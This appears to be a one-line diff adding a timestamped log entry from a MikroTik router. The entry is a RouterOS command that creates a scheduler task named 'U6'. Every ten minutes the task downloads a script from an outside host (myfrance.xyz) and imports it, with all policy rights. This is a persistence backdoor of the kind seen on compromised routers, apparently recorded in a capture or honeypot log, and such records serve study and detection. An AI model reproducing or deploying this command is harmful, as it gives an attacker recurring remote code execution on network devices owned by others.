@@ -1,0 +1,1 @@
+2021-05-01 01:44:49.584457+00:00 -|::|- /system scheduler add name="U6" interval=10m on-event="/tool fetch url=http://myfrance.xyz/poll/bd92e3c4-3f7a-450f-a5a0-5a0f87d4022c mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write
